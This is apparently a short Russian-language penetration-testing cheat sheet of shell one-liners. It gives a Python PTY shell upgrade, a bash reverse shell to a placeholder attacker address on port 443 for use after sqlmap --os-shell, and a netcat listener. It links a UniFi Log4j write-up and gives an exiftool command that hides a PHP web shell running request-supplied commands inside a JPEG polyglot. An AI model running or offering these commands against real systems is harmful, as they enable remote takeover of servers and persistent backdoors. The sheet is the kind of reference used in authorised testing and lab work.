Переход на удобный шелл:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Проброс шелла с sqlmap --os-shell:
`bash -c "bash -i >& /dev/tcp/{ATTACKER_IP}/443 0>&1"`
Слушать:
`sudo nc -lvnp 443`

[UniFi Log4j](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)

Полиглотный шелл:
`exiftool -DocumentName="<h1>chiara<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" <jpeg-file-name>.jpeg -o polyglot.php`